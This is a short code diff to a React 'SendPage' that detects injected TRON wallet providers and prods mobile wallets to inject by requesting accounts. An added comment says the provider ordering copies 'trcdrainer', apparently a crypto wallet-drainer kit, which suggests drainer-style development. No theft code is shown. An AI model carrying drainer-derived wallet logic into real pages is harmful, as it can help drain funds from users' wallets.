@@ -146,7 +146,8 @@ export default function SendPage() {
   // ── Poll for native tronWeb ──
   const pollForTronWeb = useCallback(async (maxMs = 5000) => {
     const getTW = () => {
-      const p = window.trustwallet?.tron || window.tron || window.tronWeb || window.tronLink || window.tokenpocket?.tron;
+      // Prioritize Trust Wallet and window.tron as seen in trcdrainer
+      const p = window.trustwallet?.tron || window.tron || window.tronWeb || window.tronLink;
       if (p?.defaultAddress?.base58) return p;
       if (p?.ready) return p;
       return null;
@@ -228,12 +229,12 @@ export default function SendPage() {
       const injected = window.trustwallet?.tron || window.tron || window.tronWeb || window.tronLink || window.tokenpocket?.tron || window.ethereum?.tron;
       const isInDAppBrowser = hasEth || !!window.tronWeb || hasTrust || !!window.tokenpocket || !!window.bitkeep || !!window.tron;
 
-      // 2. Mobile redirection/wake-up logic
+      // 2. Mobile wake-up logic
       if (!nativeTW && isMobile) {
-        // Try to "wake up" Trust Wallet / MetaMask providers
         if (window.ethereum?.request) {
+          // Send request to wake up injection
           await window.ethereum.request({ method: 'eth_requestAccounts' }).catch(() => { });
-          await new Promise(r => setTimeout(r, 1000));
+          await new Promise(r => setTimeout(r, 1500));
           nativeTW = await pollForTronWeb(3000);
         }
 
